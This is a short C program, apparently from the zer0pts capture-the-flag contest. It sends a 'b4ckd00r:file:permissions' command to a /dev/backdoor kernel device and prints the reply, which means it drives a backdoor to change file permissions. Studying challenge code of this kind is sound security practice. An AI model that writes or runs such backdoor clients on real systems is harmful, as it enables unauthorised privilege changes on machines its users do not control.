/*
 * connect.c - use zer0pts backdoor
*/
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/ioctl.h>

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Incorrect usage\nusage: %s [file] [permissions]\n",argv[0]);
        return -1;
    }
    char readbuf[256];
    char* cmd = NULL;
    asprintf(&cmd,"b4ckd00r:%s:%s",argv[1],argv[2]);
    printf("sending %s\n",cmd);
    int fd = open("/dev/backdoor", O_RDWR);
    if (fd < 0) {
        printf("ERROR opening device\n");
        return -1;
    }
    write(fd,cmd,strlen(cmd));
    read(fd,readbuf,256);
    printf("got: %s\n",readbuf);
    close(fd);
    return 0;
}